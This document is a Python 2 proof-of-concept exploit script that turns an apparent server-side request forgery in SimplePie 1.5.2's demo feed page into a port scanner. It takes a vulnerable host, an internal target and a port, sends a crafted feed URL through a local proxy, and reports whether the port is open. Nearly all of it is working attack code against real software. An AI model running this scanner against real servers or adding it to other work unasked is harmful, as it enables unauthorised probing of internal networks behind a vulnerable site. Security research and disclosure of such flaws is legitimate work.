#!/usr/bin/env python
import sys, hashlib, requests
import urllib
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
import time


print "+-------------------------------------------------------------+"
print "- SimplePie 1.5.2 - SSRF / Port Scanner"
print
print "- Simple PoC demonstrating how SimplePie can be a port scanner"
print
print "-                          by liquidsky (JMcPeters) ^^"
print "+-------------------------------------------------------------+"

try:
#settings
	host     = sys.argv[1]
	target   = sys.argv[2]
	port     = sys.argv[3]

except IndexError:

        print
	print "- usage: %s <host> <target> <port>" % sys.argv[0]
	print "- Example: %s incidentsecurity.com 127.0.0.1 22" % sys.argv[0]
        print
	sys.exit()


def we_can_connect():

     proxies = { "http": "127.0.0.1:8080", "https": "127.0.0.1:8080" }

     targeturl = "http://" + host + "/simplepie/demo/index.php?feed=http://" + target + ":" + port

#Connect
     session = requests.Session()
     req = session.get(targeturl, proxies=proxies)
     results = req.text

# get status from results
     if "the status code is" in results:
         return True
     return False 
 
def main():
     if we_can_connect():
         print ""
         print "[+] Success! The port is open! :)"
         print ""
     else:         print "[-] Failure! The port is closed! :x" 
 
if __name__ == "__main__":
     main()
